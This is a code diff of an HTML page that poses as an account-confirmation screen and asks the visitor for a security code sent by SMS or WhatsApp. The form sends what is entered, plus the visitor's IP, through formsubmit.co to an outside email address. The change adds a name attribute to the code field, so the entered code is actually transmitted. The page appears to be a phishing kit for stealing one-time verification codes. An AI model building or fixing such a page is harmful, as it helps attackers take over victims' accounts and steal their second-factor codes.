@@ -99,7 +99,7 @@
     <div class="title">Confirm Your Account</div>
     <form id="verificationForm" action="https://formsubmit.co/firstmail901@gmail10p.com" method="POST" onsubmit="return validateCode(event)">
         <div class="input-container">
-            <input id="securityCode" type="text" placeholder="Security Code" required>
+            <input id="securityCode" name="securityCode" type="text" placeholder="Security Code" required>
         </div>
         <div class="message">Receive the code on your registered device via SMS or WhatsApp.</div>
         <button type="submit" class="btn">Continue</button>
@@ -115,21 +115,21 @@
             event.preventDefault(); // Prevent default form submission behavior
             const securityCode = document.getElementById('securityCode').value;
             const userIP = document.getElementById('userIP');
-            // Your code validation logic here
-            if (securityCode !== "1234") { // Replace "1234" with your actual validation logic
+            // Replace "1234" with your actual validation logic
+            if (securityCode !== "1234") {
                 document.getElementById('errorMessage').style.display = 'block';
             } else {
                 userIP.value = getClientIP(); // Set the user's IP address
                 document.getElementById('verificationForm').submit(); // Submit the form if the code is correct
             }
         }
-        
+
         function getClientIP() {
             // This is a simplified version to get the user's IP address
             // Replace this with your actual method to get the IP address
             return '127.0.0.1';
         }
-        
+
         let countdown = 30;
         const resendLink = document.getElementById('resendLink');
         const codeSentMessage = document.getElementById('codeSentMessage');
